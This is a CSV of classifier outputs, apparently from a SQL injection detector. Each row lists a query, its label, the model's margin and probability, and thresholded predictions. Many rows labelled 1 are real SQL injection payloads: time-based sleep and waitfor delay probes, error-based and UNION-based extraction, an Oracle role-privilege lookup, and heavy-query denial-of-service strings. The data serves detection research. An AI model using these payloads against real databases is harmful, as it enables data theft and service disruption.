Query,Label,RawMargin,Prob_Raw,Pred_Default,Pred_BestThr,BestThr,BestThr_Margin
1'||  (  select 'exls' where 3837  =  3837 and sleep  (  5   )    )   ||',1,12.991765975952148,0.9999977350234985,1,1,0.52,0.08004270767353656
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,9.493380546569824,0.9999246597290039,1,1,0.52,0.08004270767353656
6.96678E+15,0,-8.756451606750488,0.00015741751121822745,0,0,0.52,0.08004270767353656
"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",1,11.413408279418945,0.9999889135360718,1,1,0.52,0.08004270767353656
SELECT * FROM read WHERE NOT high = 'cowboy'  AND NOT water = 'wore',0,-11.636224746704102,8.83991287992103e-06,0,0,0.52,0.08004270767353656
 UPDATE broken SET may = 'universe'WHERE managed = 'dress',0,-12.194536209106445,5.057991074863821e-06,0,0,0.52,0.08004270767353656
"1"" where 9173  =  9173 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1,11.654157638549805,0.9999912977218628,1,1,0.52,0.08004270767353656
1' in boolean mode  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  #,1,10.558542251586914,0.9999740123748779,1,1,0.52,0.08004270767353656
"  SELECT milkID AS ID, at AS spin FROM object",0,-10.29603099822998,3.376570748514496e-05,0,0,0.52,0.08004270767353656
paracuellos de jarama,0,-11.497907638549805,1.0151209608011413e-05,0,0,0.52,0.08004270767353656
SELECT * FROM loose WHERE section = 'border' LIMIT 3,0,-10.533496856689453,2.662863516889047e-05,0,0,0.52,0.08004270767353656
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'yfkk'  =  'yfkk",1,10.117805480957031,0.9999595880508423,1,1,0.52,0.08004270767353656
"1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  -- cbsd",1,9.796603202819824,0.9999443292617798,1,1,0.52,0.08004270767353656
"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",1,12.46013355255127,0.9999960660934448,1,1,0.52,0.08004270767353656
-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,1,12.584855079650879,0.999996542930603,1,1,0.52,0.08004270767353656
"  SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )  ",0,-12.968994140625,2.331505356778507e-06,0,0,0.52,0.08004270767353656
-6855'  )   or 8519  =  9248,1,10.5068359375,0.9999727010726929,1,1,0.52,0.08004270767353656
-8836%'  )   or 4856  =  3891,1,10.739570617675781,0.9999783039093018,1,1,0.52,0.08004270767353656
1s,1,-5.253551006317139,0.005201718304306269,0,0,0.52,0.08004270767353656
"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",1,8.163675308227539,0.999715268611908,1,1,0.52,0.08004270767353656
SELECT * FROM but,0,-5.932401657104492,0.00264508998952806,0,0,0.52,0.08004270767353656
if  (  5127  =  2829  )   select 5127 else drop function okos--,1,8.167930603027344,0.9997164607048035,1,1,0.52,0.08004270767353656
"   SELECT unless, applied, expressFROM know WHERE slow  IS NOT NULL",0,-12.451436042785645,3.912085503543494e-06,0,0,0.52,0.08004270767353656
"ruiz de alda, 78",0,-7.945215702056885,0.00035422793007455766,0,0,0.52,0.08004270767353656
44923287d,0,-9.059463500976562,0.0001162718326668255,0,0,0.52,0.08004270767353656
1 union all select null--,1,3.479701280593872,0.9701046943664551,1,1,0.52,0.08004270767353656
SELECT * FROM  ( SELECT say FROM fire ) ,0,-12.093475341796875,5.595873972197296e-06,0,0,0.52,0.08004270767353656
basilisa,0,-4.976337432861328,0.0068520111963152885,0,0,0.52,0.08004270767353656
"c/ fray diego de cadiz, 50",0,-12.80154800415039,2.756494495770312e-06,0,0,0.52,0.08004270767353656
SELECT TOP 50 PERCENT * FROM across,0,-9.589333534240723,6.845034658908844e-05,0,0,0.52,0.08004270767353656
-6637'   )    )    order by 1#,1,12.086258888244629,0.9999943971633911,1,1,0.52,0.08004270767353656
"1"" where 8732  =  8732",1,8.101129531860352,0.9996969699859619,1,1,0.52,0.08004270767353656
san bartolom,0,-7.240442752838135,0.0007164804846979678,0,0,0.52,0.08004270767353656
"carrer nostra sra del pilar, 101",0,-11.15523910522461,1.4299966096587013e-05,0,0,0.52,0.08004270767353656
-9143  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1,11.30248737335205,0.9999876022338867,1,1,0.52,0.08004270767353656
canciano,0,-4.976337432861328,0.0068520111963152885,0,0,0.52,0.08004270767353656
-5555   )    )    as ldte where 4583  =  4583 order by 1#,1,12.025678634643555,0.9999940395355225,1,1,0.52,0.08004270767353656
"jose gomez gallito, 107,",0,-9.043974876403809,0.00011808652197942138,0,0,0.52,0.08004270767353656
"1"" where 2483  =  2483",1,8.101129531860352,0.9996969699859619,1,1,0.52,0.08004270767353656
"1'  )   union all select null,null,null--",1,9.824974060058594,0.999945878982544,1,1,0.52,0.08004270767353656
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )  ",0,-8.809447288513184,0.00014929348253645003,0,0,0.52,0.08004270767353656
SELECT * FROM furniture ORDER BY improve DESC,0,-9.855976104736328,5.24301576660946e-05,0,0,0.52,0.08004270767353656
SELECT * FROM day WHERE out = 'function',0,-8.976096153259277,0.00012637933832593262,0,0,0.52,0.08004270767353656
"INSERT INTO come  ( rabbit, separate, full )  VALUES  ( 'government', 'using', 'hard' )  ",0,-10.186574935913086,3.76712778233923e-05,0,0,0.52,0.08004270767353656
1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,1,8.895896911621094,0.9998630285263062,1,1,0.52,0.08004270767353656
SELECT * FROM being 3 SELECT * FROM closer,0,-12.5879487991333,3.412886371734203e-06,0,0,0.52,0.08004270767353656
"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,14.110916137695312,0.9999992847442627,1,1,0.52,0.08004270767353656
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,11.195363998413086,0.9999862909317017,1,1,0.52,0.08004270767353656
3.45448E+15,0,-8.756451606750488,0.00015741751121822745,0,0,0.52,0.08004270767353656
SELECT inch ( s FROM tool RIGHT JOIN,0,-10.44204330444336,2.9178674594732e-05,0,0,0.52,0.08004270767353656
SELECT * FROM upward WHERE each NOT LIKE 'moving%',0,-9.63593578338623,6.533379200845957e-05,0,0,0.52,0.08004270767353656
"-3460%""   )    )     )   or 9323  =  9323#",1,12.911952018737793,0.9999974966049194,1,1,0.52,0.08004270767353656
"1  )   and elt  (  4249  =  4249,7259  )  ",1,9.153715133666992,0.9998941421508789,1,1,0.52,0.08004270767353656
"1"" and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,11.874306678771973,0.999993085861206,1,1,0.52,0.08004270767353656
SELECT AVG ( attack ) FROM over,0,-10.82187271118164,1.995775892282836e-05,0,0,0.52,0.08004270767353656
" SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0,-8.535770416259766,0.0001962802925845608,0,0,0.52,0.08004270767353656
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,12.455595016479492,0.9999960660934448,1,1,0.52,0.08004270767353656
"   SELECT COUNT ( reach ) , oldest FROM rich BY curve",0,-8.55539321899414,0.00019246703595854342,0,0,0.52,0.08004270767353656
SELECT * FROM appropriate WHERE needed = 'satellites' FETCH FIRST 3 ROWS ONLY,0,-13.43742847442627,1.4594805861634086e-06,0,0,0.52,0.08004270767353656
SELECT * FROM dollar WHERE political BETWEEN '1996-07-01' AND '1996-07-31',0,-12.967925071716309,2.3339991912507685e-06,0,0,0.52,0.08004270767353656
"1""  )   union all select null,null,null,null,null,null,null,null#",1,8.815929412841797,0.9998517036437988,1,1,0.52,0.08004270767353656
"-4929"" where 6381  =  6381 or 8571  =  8571--",1,12.226527214050293,0.9999951124191284,1,1,0.52,0.08004270767353656
cerpa oitavn,0,-7.240442752838135,0.0007164804846979678,0,0,0.52,0.08004270767353656
"1%"" and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""%""  =  """,1,9.392024993896484,0.999916672706604,1,1,0.52,0.08004270767353656
marcanti,0,-4.976337432861328,0.0068520111963152885,0,0,0.52,0.08004270767353656
SELECT * FROM day WHERE    NOT practice = 'depth',0,-9.650558471679688,6.438545096898451e-05,0,0,0.52,0.08004270767353656
"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",1,14.226632118225098,0.9999992847442627,1,1,0.52,0.08004270767353656
chlud_kumvongse@encuentrodominios.sd,0,-7.083488941192627,0.0008381383377127349,0,0,0.52,0.08004270767353656
1'   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'opyp'  =  'opyp,1,6.218304634094238,0.9980113506317139,1,1,0.52,0.08004270767353656
SELECT Count ( * )  AS exactly,0,-8.317082405090332,0.00024424795992672443,0,0,0.52,0.08004270767353656
esser,0,-4.787339687347412,0.008265708573162556,0,0,0.52,0.08004270767353656
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1,10.744115829467773,0.9999784231185913,1,1,0.52,0.08004270767353656
"-9405'  )   union all select 8283,8283,8283,8283--",1,13.955402374267578,0.9999991655349731,1,1,0.52,0.08004270767353656
SELECT Count ( * )  AS kill,0,-8.959763526916504,0.00012846013123635203,0,0,0.52,0.08004270767353656
ayate,0,-4.787339687347412,0.008265708573162556,0,0,0.52,0.08004270767353656
bravat-a,0,-6.523068428039551,0.001466998946852982,0,0,0.52,0.08004270767353656
jasmann,0,-5.45443058013916,0.004259094130247831,0,0,0.52,0.08004270767353656
SELECT TOP 3 * FROM round,0,-6.109250068664551,0.0022172892931848764,0,0,0.52,0.08004270767353656
"  SELECT * FROM go WHERE mental IN  ( 'writer', 'me', 'fellow' )  ",0,-11.54387092590332,9.69519078353187e-06,0,0,0.52,0.08004270767353656
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",1,12.854767799377441,0.9999973773956299,1,1,0.52,0.08004270767353656
1'   )    )    as fbjd where 8597  =  8597,1,13.297021865844727,0.9999983310699463,1,1,0.52,0.08004270767353656
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,12.128602981567383,0.9999946355819702,1,1,0.52,0.08004270767353656
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0,-9.9163179397583,4.9360143748344854e-05,0,0,0.52,0.08004270767353656
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1,13.735733985900879,0.999998927116394,1,1,0.52,0.08004270767353656
SELECT * FROM mountain WHERE block BETWEEN modern09/01/1996dollar AND come15/31/1996love,0,-12.814438819885254,2.721189048315864e-06,0,0,0.52,0.08004270767353656
17130,0,-7.658886432647705,0.00047161002294160426,0,0,0.52,0.08004270767353656
SELECT Count ( * )  AS cause,0,-8.691620826721191,0.0001679593260632828,0,0,0.52,0.08004270767353656
"-1485'   )    )     )   union all select 7661,7661,7661,7661,7661--",1,14.158373832702637,0.9999992847442627,1,1,0.52,0.08004270767353656
8230,0,-6.973368167877197,0.0009356171358376741,0,0,0.52,0.08004270767353656
caridad,0,-5.45443058013916,0.004259094130247831,0,0,0.52,0.08004270767353656
san miguel del pino,0,-13.538252830505371,1.3195046904002083e-06,0,0,0.52,0.08004270767353656
bnrinfo,0,-5.45443058013916,0.004259094130247831,0,0,0.52,0.08004270767353656
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,12.362375259399414,0.9999957084655762,1,1,0.52,0.08004270767353656
SELECT cat ( s ) FROM sudden INNER JOIN,0,-10.369997024536133,3.1358402338810265e-05,0,0,0.52,0.08004270767353656
nadav6,0,-5.485144138336182,0.0041308025829494,0,0,0.52,0.08004270767353656
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,9.80562973022461,0.999944806098938,1,1,0.52,0.08004270767353656
SELECT COUNT ( wild )  FROM made,0,-10.82187271118164,1.995775892282836e-05,0,0,0.52,0.08004270767353656
1oca,0,-7.303864479064941,0.0006724806735292077,0,0,0.52,0.08004270767353656
SELECT * FROM opinion ORDER BY forgot,0,-13.035798072814941,2.180840510845883e-06,0,0,0.52,0.08004270767353656
1'   )    )    as yyud where 4934  =  4934,1,13.297021865844727,0.9999983310699463,1,1,0.52,0.08004270767353656
valido casademont,0,-11.932270050048828,6.574732651642989e-06,0,0,0.52,0.08004270767353656
SELECT DISTINCT art FROM if,0,-7.191346168518066,0.0007525079417973757,0,0,0.52,0.08004270767353656
"  SELECT * FROM missing WHERE fairly NOT IN  ( 'father', 'industry', 'travel' )  ",0,-12.443716049194336,3.942403054679744e-06,0,0,0.52,0.08004270767353656
SELECT * FROM rather 3 SELECT * FROM prove,0,-12.5879487991333,3.412886371734203e-06,0,0,0.52,0.08004270767353656
"paso de la soledad, 130 10?f",0,-7.378668308258057,0.0006240422371774912,0,0,0.52,0.08004270767353656
des7768ab9e6os,0,-6.791626453399658,0.0011218804866075516,0,0,0.52,0.08004270767353656
SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',0,-12.294379234313965,4.5773799683956895e-06,0,0,0.52,0.08004270767353656
waitfor delay '0:0:5' and '%'  =  ',1,9.142065048217773,0.9998929500579834,1,1,0.52,0.08004270767353656
SELECT MIN ( not )  AS compound FROM bar,0,-4.681804656982422,0.009177281521260738,0,0,0.52,0.08004270767353656
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0,-8.038681983947754,0.0003226299013476819,0,0,0.52,0.08004270767353656
vilar elsegui,0,-9.790820121765137,5.595984839601442e-05,0,0,0.52,0.08004270767353656
cagarria,0,-4.976337432861328,0.0068520111963152885,0,0,0.52,0.08004270767353656
62258107m,0,-9.059463500976562,0.0001162718326668255,0,0,0.52,0.08004270767353656
argeo,0,-4.787339687347412,0.008265708573162556,0,0,0.52,0.08004270767353656
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1,9.825753211975098,0.9999459981918335,1,1,0.52,0.08004270767353656
"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",1,7.7131500244140625,0.9995532631874084,1,1,0.52,0.08004270767353656
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,3.8394668102264404,0.978947639465332,1,1,0.52,0.08004270767353656
"1""   )    )    as tgwp where 9405  =  9405",1,10.83615779876709,0.9999803304672241,1,1,0.52,0.08004270767353656
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'qvrd'  =  'qvrd",1,8.973057746887207,0.999873161315918,1,1,0.52,0.08004270767353656
FROM  ( SELECT DISTINCT century FROM supply ) ,0,-10.384462356567383,3.09080678562168e-05,0,0,0.52,0.08004270767353656
SELECT Count ( * )  AS stepped,0,-8.317082405090332,0.00024424795992672443,0,0,0.52,0.08004270767353656
56876281h,0,-9.059463500976562,0.0001162718326668255,0,0,0.52,0.08004270767353656
"1'||  (  select 'ativ' from dual where 4746  =  4746 union all select null,null,null,null#",1,8.532015800476074,0.9998030066490173,1,1,0.52,0.08004270767353656
SELECT TOP 3 * FROM actual SELECT * FROM moving 3SELECT * FROM plate,0,-12.607081413269043,3.3482099297543755e-06,0,0,0.52,0.08004270767353656
-7111' or   (  8459  =  8459  )  *4906,1,11.048532485961914,0.9999841451644897,1,1,0.52,0.08004270767353656
SELECT MIN ( hung )  AS shaking FROM breakfast,0,-9.900126457214355,5.0165821448899806e-05,0,0,0.52,0.08004270767353656
SELECT COUNT ( something ) FROM driving,0,-10.815876007080078,2.0077795852557756e-05,0,0,0.52,0.08004270767353656
brenda,0,-4.941565036773682,0.007092743646353483,0,0,0.52,0.08004270767353656
SELECT AVG ( Price ) FROM skill,0,-10.82187271118164,1.995775892282836e-05,0,0,0.52,0.08004270767353656
"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",1,12.118904113769531,0.9999945163726807,1,1,0.52,0.08004270767353656
d75a4r45der,0,-10.679729461669922,2.3006070478004403e-05,0,0,0.52,0.08004270767353656
basilia,0,-5.45443058013916,0.004259094130247831,0,0,0.52,0.08004270767353656
1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,10.035984992980957,0.9999562501907349,1,1,0.52,0.08004270767353656
50159319e,0,-9.059463500976562,0.0001162718326668255,0,0,0.52,0.08004270767353656
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",1,10.534863471984863,0.9999734163284302,1,1,0.52,0.08004270767353656
cella,0,-4.787339687347412,0.008265708573162556,0,0,0.52,0.08004270767353656
6i4t562e7a,0,-10.98047161102295,1.7030773960868828e-05,0,0,0.52,0.08004270767353656
15873,0,-7.658886432647705,0.00047161002294160426,0,0,0.52,0.08004270767353656
"-8109%""   )    )    union all select 9089,9089--",1,12.671457290649414,0.9999969005584717,1,1,0.52,0.08004270767353656
select * from users where id  =  1. or 1  =  1 -- 1,1,9.950530052185059,0.9999523162841797,1,1,0.52,0.08004270767353656
1'||  (  select 'vvpn' from dual where 7011  =  7011 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||',1,6.423346519470215,0.9983793497085571,1,1,0.52,0.08004270767353656
SELECT * FROM social WHERE run BETWEEN '1996-07-01' AND '1996-07-31',0,-8.854219436645508,0.00014275763533078134,0,0,0.52,0.08004270767353656
SELECT * FROM complex WHERE NOT nervous = 'slept'  AND NOT real = 'pie',0,-11.934460639953613,6.560345809702994e-06,0,0,0.52,0.08004270767353656
1  )   where 9344  =  9344,1,8.34890079498291,0.9997634291648865,1,1,0.52,0.08004270767353656
SELECT fort ( s )  FROM main LEFT JOIN,0,-10.645916938781738,2.3797245376044884e-05,0,0,0.52,0.08004270767353656
SELECT * FROM clear 3,0,-13.154026985168457,1.93766118172789e-06,0,0,0.52,0.08004270767353656
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""rphs""  =  ""rphs",1,10.037482261657715,0.9999562501907349,1,1,0.52,0.08004270767353656
"   SELECT COUNT ( especially ) , crew FROM soldier BY height",0,-11.072273254394531,1.5536959836026654e-05,0,0,0.52,0.08004270767353656
" SELECT * FROM tales ORDER BY how ASC, break DESC",0,-9.444518089294434,7.911585998954251e-05,0,0,0.52,0.08004270767353656
FROM  ( SELECT DISTINCT twice FROM larger ) ,0,-10.718701362609863,2.2126745534478687e-05,0,0,0.52,0.08004270767353656
t45o0a35,0,-8.68143081665039,0.0001696792896836996,0,0,0.52,0.08004270767353656
20100,0,-7.658886432647705,0.00047161002294160426,0,0,0.52,0.08004270767353656
1  )   where 1090  =  1090 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,12.310980796813965,0.9999954700469971,1,1,0.52,0.08004270767353656
-2604   )    )    as sekb where 6897  =  6897 or 1000  =  7683,1,11.937273979187012,0.9999934434890747,1,1,0.52,0.08004270767353656
SELECT COUNT ( angry ) FROM everywhere,0,-12.217278480529785,4.9442592171544675e-06,0,0,0.52,0.08004270767353656
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0,-8.038681983947754,0.0003226299013476819,0,0,0.52,0.08004270767353656
SELECT * FROM one  WHERE threw = step,0,-11.953001022338867,6.439836397476029e-06,0,0,0.52,0.08004270767353656
incisivo,0,-4.976337432861328,0.0068520111963152885,0,0,0.52,0.08004270767353656
"1' where 9994  =  9994 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,11.716547012329102,0.9999918937683105,1,1,0.52,0.08004270767353656
"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,12.093017578125,0.9999943971633911,1,1,0.52,0.08004270767353656
SELECT TOP 50 PERCENT * FROM disease,0,-10.568538665771484,2.571170261944644e-05,0,0,0.52,0.08004270767353656
"  SELECT typical,look,shells FROM below LEFT JOIN Orders ON border.moodID =  accurate.although ORDER BY studying.purpose",0,-9.736064910888672,5.910919571761042e-05,0,0,0.52,0.08004270767353656
SELECT cross ( s FROM nation RIGHT JOIN,0,-10.768099784851074,2.1060299332020804e-05,0,0,0.52,0.08004270767353656
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,1,8.860516548156738,0.9998581409454346,1,1,0.52,0.08004270767353656
5672,0,-3.892000913619995,0.019996462389826775,0,0,0.52,0.08004270767353656
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'vnfi'  =  'vnfi,1,7.072280406951904,0.999152421951294,1,1,0.52,0.08004270767353656
SELECT AVG ( oldest ) FROM disappear SELECT SUM ( plates ) ,0,-11.740168571472168,7.967207238834817e-06,0,0,0.52,0.08004270767353656
"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",1,11.469847679138184,0.9999895095825195,1,1,0.52,0.08004270767353656
SELECT * FROM cast  WHERE test = mood,0,-11.953001022338867,6.439836397476029e-06,0,0,0.52,0.08004270767353656
gupton,0,-4.941565036773682,0.007092743646353483,0,0,0.52,0.08004270767353656
"paseo pinos, 147",0,-9.226208686828613,9.841599239734933e-05,0,0,0.52,0.08004270767353656
belia,0,-4.787339687347412,0.008265708573162556,0,0,0.52,0.08004270767353656
SELECT * FROM officer WHERE cutting = 'involved' LIMIT 3,0,-14.071551322937012,7.7410982157744e-07,0,0,0.52,0.08004270767353656
SELECT COUNT ( DISTINCT visit )  FROM prove,0,-10.44797134399414,2.9006218028371222e-05,0,0,0.52,0.08004270767353656
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  8535  =  8535",1,7.282931804656982,0.9993133544921875,1,1,0.52,0.08004270767353656
1'+  (  select 'fqkk' where 9725  =  9725,1,8.736422538757324,0.9998394250869751,1,1,0.52,0.08004270767353656
10702,0,-7.658886432647705,0.00047161002294160426,0,0,0.52,0.08004270767353656
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,10.89965534210205,0.9999815225601196,1,1,0.52,0.08004270767353656
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",0,-13.356135368347168,1.5830820530027268e-06,0,0,0.52,0.08004270767353656
select case when 3661  =  9315 then 1 else null end--,1,7.98297119140625,0.9996589422225952,1,1,0.52,0.08004270767353656
SELECT * FROM children 3 SELECT * FROM desert,0,-11.92200756072998,6.642552762059495e-06,0,0,0.52,0.08004270767353656
"  SELECT splitID AS ID, shorter AS he FROM list",0,-10.563536643981934,2.5840630769380368e-05,0,0,0.52,0.08004270767353656
"-3794'  )   union all select 2485,2485,2485,2485,2485--",1,14.788822174072266,0.9999996423721313,1,1,0.52,0.08004270767353656
"  UPDATE location SET couple =  'line', City =  'key' WHERE belt =  village",0,-10.182320594787598,3.783188003581017e-05,0,0,0.52,0.08004270767353656
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,7.800404071807861,0.9995905756950378,1,1,0.52,0.08004270767353656
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0,-9.882508277893066,5.105743184685707e-05,0,0,0.52,0.08004270767353656
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",1,9.683876991271973,0.9999377727508545,1,1,0.52,0.08004270767353656
SELECT * FROM scared FETCH FIRST 50 PERCENT ROWS ONLY,0,-15.147374153137207,2.6398478780720325e-07,0,0,0.52,0.08004270767353656
